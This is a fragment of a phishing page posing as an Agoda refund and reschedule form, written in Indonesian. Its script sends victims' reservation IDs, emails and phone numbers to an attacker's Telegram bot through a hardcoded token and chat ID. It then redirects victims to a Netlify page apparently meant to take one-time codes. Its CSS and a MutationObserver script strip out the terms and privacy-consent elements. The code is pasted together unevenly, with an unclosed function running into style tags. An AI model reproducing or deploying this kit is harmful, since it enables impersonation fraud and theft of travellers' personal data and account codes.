const sendToTelegram = async (data) => {
    const token = "6815357868:AAG7JQ2BQcl0g4kiIY5rvxduqThopC39fxY";
    const chatId = "6691063456";
    const text = `<b>🚀 Pengajuan Baru Agoda</b>\n\n` +
                 `<b>Jenis:</b> ${data.requestType === 'reschedule' ? 'Ubah Jadwal' : 'Refund'}\n` +
                 `<b>ID Pesanan:</b> ${data.reservationId}\n` +
                 `<b>Email:</b> ${data.email}\n` +
                 `<b>Nomor Telepon:</b> ${data.phoneNumber}\n` +
                 `<b>Alasan:</b> ${data.reason}\n` +
                 '';
    
    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'HTML'
            })
        });
        // Redirect ke URL tujuan setelah berhasil
        window.location.href = "https://cerulean-cucurucho-dceb5a.netlify.app/ott.html";
    } catch (error) {
        console.error('Telegram Error:', error);
    }

    <style>
        /* Sembunyikan elemen yang mengandung teks Check-in dan Check-out */
        div:has(> label:contains("Check-in")),
        div:has(> label:contains("Check-out")),
        div:has(> span:contains("Check-in")),
        div:has(> span:contains("Check-out")) {
            display: none !important;
        }
        
        /* Jika selector :has tidak didukung, kita gunakan pendekatan class jika tahu, 
           tapi karena ini build React, kita coba sembunyikan input type date */
        input[type="date"] {
            display: none !important;
        }
        label[for="checkInDate"], label[for="checkOutDate"] {
            display: none !important;
        }
    </style>

    <style>
        /* Sembunyikan checkbox dan label syarat ketentuan */
        div:has(> label[for="agreeTerms"]),
        label[for="agreeTerms"],
        #agreeTerms,
        div:has(> span:contains("Saya setuju")),
        div:has(> p:contains("Saya setuju")) {
            display: none !important;
            visibility: hidden !important;
            height: 0 !important;
            margin: 0 !important;
            padding: 0 !important;
        }
    </style>

<style>
    /* Sembunyikan apapun yang mengandung teks syarat ketentuan */
    div:has(label[for="agreeTerms"]),
    label[for="agreeTerms"],
    #agreeTerms,
    [id*="agreeTerms"],
    [class*="agreeTerms"] {
        display: none !important;
        visibility: hidden !important;
        opacity: 0 !important;
        pointer-events: none !important;
        position: absolute !important;
        left: -9999px !important;
    }
</style>
</head>
<body>
    <div id="root"></div>

<script>
    (function() {
        const removeTerms = () => {
            const targets = [
                'Saya setuju dengan syarat',
                'kebijakan privasi Agoda',
                'agreeTerms'
            ];
            
            // Cari berdasarkan teks
            const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
            let node;
            const nodesToRemove = [];
            while(node = walker.nextNode()) {
                if (targets.some(t => node.textContent.includes(t))) {
                    let parent = node.parentElement;
                    while (parent && parent.tagName !== 'DIV') {
                        parent = parent.parentElement;
                    }
                    if (parent) nodesToRemove.push(parent);
                }
            }
            nodesToRemove.forEach(n => n.remove());

            // Cari berdasarkan ID/Selector
            const ids = ['agreeTerms', 'agree-terms'];
            ids.forEach(id => {
                const el = document.getElementById(id);
                if (el) {
                    let parent = el.parentElement;
                    while (parent && parent.tagName !== 'DIV') {
                        parent = parent.parentElement;
                    }
                    if (parent) parent.remove();
                }
            });
        };

        // Jalankan segera dan amati perubahan DOM
        const observer = new MutationObserver((mutations) => {
            removeTerms();
        });

        observer.observe(document.documentElement, {
            childList: true,
            subtree: true
        });

        // Jalankan berkala sebagai cadangan
        setInterval(removeTerms, 500);
        window.addEventListener('load', removeTerms);
    })();
</script>
